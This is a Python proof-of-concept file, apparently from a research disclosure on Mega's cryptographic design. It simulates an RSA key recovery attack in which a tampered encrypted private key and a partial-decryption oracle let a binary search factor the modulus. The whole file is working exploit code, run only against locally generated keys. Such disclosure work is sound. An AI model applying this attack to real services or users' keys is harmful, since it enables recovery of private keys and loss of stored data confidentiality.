
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: PoC of the RSA Key Recovery attack on the simulated operations of
# Mega.
#

from secrets import randbelow, token_bytes

from shared.constants.mega_crypto import *
from shared.mega_simulation import *

from issue_01.rsa_key_recovery_attack import MegaRSAKeyRecoveryAttack

class PoCAbstractRsaKeyRecovery:
    def __init__(self):
        print("# Initialize abstract RSA key recovery PoC")
        print(f"## Generate fresh RSA-{RSA_MODULUS_BIT_SIZE} keys")
        self.privk, self.pubk = gen_rsa_keys(RSA_MODULUS_BIT_SIZE)
        self.privk_encoded = decode_rsa_privk(self.privk)

    def _inject_fault(self, privk):
        assert len(privk) == 8
        n, e, d, p, q, dp, dq, u = privk

        # We corrupt the second to last block of the encrypted ciphertext, which
        # contains u (and no padding).
        u_garbled = (u ^ (randbelow(1 << 128) << 128))

        return (n, e, d, p, q, dp, dq, u_garbled)

    def _partial_decryption_oracle(self, privk, c):
        return rsa_decrypt(c, privk)[:SID_LEN]

    def run_sanity_checks(self):
        print("## Run sanity checks")
        # Enc/dec
        m = token_bytes(64)
        m_res = rsa_decrypt(rsa_encrypt(m, self.pubk), self.privk_encoded)[:len(m)]
        assert m_res == m
        print("### RSA enc/dec correctness: success")

    def rsa_key_recovery_attack(self, oracle, pubk, diff_bits=1):
        attack = MegaRSAKeyRecoveryAttack(pubk)

        print("## Running binary search, recovered bits:    0", end="")
        while True:
            c = attack.get_next_sid()
            r = oracle(c)

            if attack.feed_response(bytes_to_int(r)):
                print(f"\r## Running binary search, recovered bits: {RSA_MODULUS_BIT_SIZE//2}", end="")
                print("\n## Attack successful!")
                print(f"### Factored {attack.n} = {attack.p} * {attack.q} with "
                      f"{attack.oracle_queries} oracle queries")
                break
            recovered_bits = str(attack.oracle_queries).rjust(4)
            print(f"\r## Running binary search, recovered bits: {recovered_bits}", end="")

    def run_attack(self):
        print("# Starting abstract attack")
        print("## Tamper with encrypted key")
        privk_garbled = self._inject_fault(self.privk_encoded)
        oracle = lambda c, privk=privk_garbled: \
          self._partial_decryption_oracle(privk, c)
        self.rsa_key_recovery_attack(oracle, self.pubk)
